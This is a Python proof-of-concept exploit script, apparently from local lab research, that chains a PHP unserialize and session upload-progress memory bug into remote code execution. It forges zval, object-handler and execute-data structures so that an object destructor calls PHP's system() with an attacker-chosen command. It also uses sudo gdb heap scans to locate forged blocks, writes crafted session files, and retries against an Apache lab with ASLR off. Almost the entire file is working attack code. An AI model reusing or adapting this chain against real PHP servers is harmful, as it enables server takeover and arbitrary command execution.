#!/usr/bin/env python3
"""php2shell RCE closer: forged zend_execute_data + dtor_obj=zif_system.

Chain: arm OOM orphan -> p1 -> crafted session (R:0;) -> fire reclaims the
orphaned php_unserialize_data with forged ctx (last=first_dtor=last_dtor=E);
R:0; -> var_access -> E.data[0] = forged zval Z{OBJ, IS_OBJECT_EX};
var_destroy dtors it -> zend_objects_store_del(OBJ) -> handlers->dtor_obj =
zif_system(ex=OBJ) -> arg0 = zend_string "id > .../proof" -> system().

B (t[] block address) comes from a gdb heap scan after a probe fire; with
ASLR off the identical retry reuses the same tcache slots.
"""
import struct, subprocess, sys, time, os, re
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
BASE = 0x7ffff6600000
ZIF_SYSTEM = BASE + 0x233a10
CMD = b"id > /tmp/php2shell_rce_proof.txt"
TOTAL = 512

def forge_call(B, refcount):
    r = bytearray(TOTAL)
    def put(off, raw): r[off:off+len(raw)] = raw
    put(0x00, struct.pack("<Q", B+0x20))            # Z.value = OBJ
    put(0x08, struct.pack("<I", 0x308))             # Z.type_info IS_OBJECT_EX
    put(0x20, struct.pack("<II", refcount, 8))      # OBJ gc
    put(0x38, struct.pack("<Q", B+0x90))            # OBJ.handlers
    put(0x4c, struct.pack("<I", 1))                 # ex num_args (This.u2)
    put(0x70, struct.pack("<Q", B+0xB0))            # arg0.value = CMDSTR
    put(0x78, struct.pack("<I", 6))                 # arg0 IS_STRING
    put(0x90, struct.pack("<I", 0))                 # handlers.offset
    put(0x98, struct.pack("<Q", ZIF_SYSTEM))        # free_obj
    put(0xA0, struct.pack("<Q", ZIF_SYSTEM))        # dtor_obj
    put(0xC0, struct.pack("<Q", len(CMD)))          # zend_string.len
    put(0xC8, CMD + b"\0")                          # zend_string.val
    put(0x110, struct.pack("<Q", 1))                # E.used_slots
    put(0x118, struct.pack("<Q", 0))                # E.next
    put(0x120, struct.pack("<Q", B))                # E.data[0] = Z
    return bytes(r)

def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)

def fresh_lab():
    sh("bash /tmp/php2shell_ap/rce_lab.sh >/dev/null 2>&1")
    out = sh("pgrep -P $(pgrep -f 'apache2 -f /tmp/php2shell_ap' | head -1)").stdout.strip()
    return int(out.splitlines()[0])

def alive():
    return sh(f"curl -s -o /dev/null -m 3 {URL}").returncode == 0

def scan_blocks(child):
    """gdb python: find CMD string in child rw memory; return block addrs."""
    gdb_script = f'''
set pagination off
python
import re
maps = open("/proc/{child}/maps").read()
regions = []
for line in maps.splitlines():
    mm = re.match(r"([0-9a-f]+)-([0-9a-f]+) (rw)", line)
    if mm:
        s, e = int(mm.group(1), 16), int(mm.group(2), 16)
        if e - s < (1 << 30):
            regions.append((s, e))
inf = gdb.selected_inferior()
pat = {CMD!r} + b"\\x00"
hits = []
for s, e in regions:
    try: buf = bytes(inf.read_memory(s, e - s))
    except Exception: continue
    i = 0
    while True:
        i = buf.find(pat, i)
        if i < 0: break
        hits.append(s + i); i += 1
print("HITS " + " ".join(hex(h) for h in hits[:40]))
end
'''
    open("/tmp/gdbscan.gdb", "w").write(gdb_script)
    r = sh(f"sudo -n gdb -p {child} -batch -x /tmp/gdbscan.gdb", timeout=240)
    out = r.stdout + r.stderr
    m = re.search(r"HITS ([0-9a-fx ]+)", out)
    if not m: return []
    return [int(x, 16) for x in m.group(1).split()]

def run_chain(child, B, refcount, tag):
    t_small = forge_call(B, refcount)
    s_arm = ("ca%030d" % tag)          # fire reuses the SAME sid (leaked PS(id))
    arm = P.arm_body(s_arm, BND, 20, 98304)
    st = P.send(URL, arm, BND, s_arm, 0.0, 0)[0]
    p1 = P.fire1_body(s_arm, BND, 390 * 11000)
    st1 = P.send(URL, p1, BND, s_arm, 0.0, 0)[0]
    # clean GET: completes the leaked-active session (RSHUTDOWN flush resets
    # status to none) so the next request's rfc1867 update re-initializes and
    # DECODES through the orphaned context.
    sh(f"curl -s -o /dev/null -m 5 {URL}")
    # crafted session at the SAME sid: p1 unlinked it, recreate with R:0;
    path = f"/tmp/php2shell_ap/sess/sess_{s_arm}"
    sh(f"rm -f {path}; printf 'upload_progress_x|a:1:{{s:1:\"z\";R:0;}}' > {path}; "
       f"sudo -n chown www-data:www-data {path}; sudo -n chmod 600 {path}")
    ctx = P.forge_ctx(B+0x110, B+0x110, used=1, data0=B)  # last/first_dtor=E
    body = P.fire_body(s_arm, BND, 200, ctx, n_small=149, t_small=t_small)
    st2, d2, dt2 = P.send(URL, body, BND, s_arm, 0.0, 0)
    return st, st1, st2, dt2

def main():
    refcounts = [1, 0, 2, 1, 0, 2]
    child = fresh_lab()
    print("child", child, flush=True)
    B = None
    for i in range(6):
        if not alive():
            child = fresh_lab(); print("restarted lab", child, flush=True); B = None
        rc = refcounts[i]
        if B is None:
            # probe: identical shape, harmless marker ctx
            t_small = forge_call(0, 1)
            sA = "pr%030d" % i
            arm = P.arm_body(sA, BND, 20, 98304)
            P.send(URL, arm, BND, sA, 0.0, 0)
            p1 = P.fire1_body(sA, BND, 390 * 11000)
            P.send(URL, p1, BND, sA, 0.0, 0)
            ctx0 = P.forge_ctx(0x4141414141414141, 0x4141414141414141, used=1, data0=0x4242424242424242)
            body = P.fire_body(sA, BND, 200, ctx0, n_small=149, t_small=t_small)
            st, d, dt = P.send(URL, body, BND, sA, 0.0, 0)
            print("probe fire", st, flush=True)
            hits = scan_blocks(child)
            print("scan hits:", [hex(h) for h in hits], flush=True)
            B = None
            for v in hits:               # val addr -> block base; verify markers
                blk = v - 0xC8
                r = forge_call(blk, 1)
                if r[0x08:0x0c] == struct.pack("<I", 0x308):
                    B = blk; break
            if B is None:
                print("no block found; restart", flush=True)
                child = fresh_lab(); continue
            print("B =", hex(B), flush=True)
            if not alive():
                child = fresh_lab(); print("restarted after scan", child, flush=True)
        st, st1, st2, dt2 = run_chain(child, B, rc, 100 + i)
        proof = os.path.exists("/tmp/php2shell_rce_proof.txt")
        print(f"attempt {i} rc={rc} arm={st} p1={st1} fire={st2} dt={dt2:.2f} PROOF={proof}", flush=True)
        if proof:
            print("=== RCE PROOF ===")
            print(open("/tmp/php2shell_rce_proof.txt").read())
            return
        # rescan to refresh B for next attempt (same process)
        hits = scan_blocks(child)
        B = None
        for v in hits:
            blk = v - 0xC8
            if forge_call(blk, 1)[0x08:0x0c] == struct.pack("<I", 0x308):
                B = blk; break
        print("rescan B:", hex(B) if B else None, flush=True)

if __name__ == "__main__":
    main()
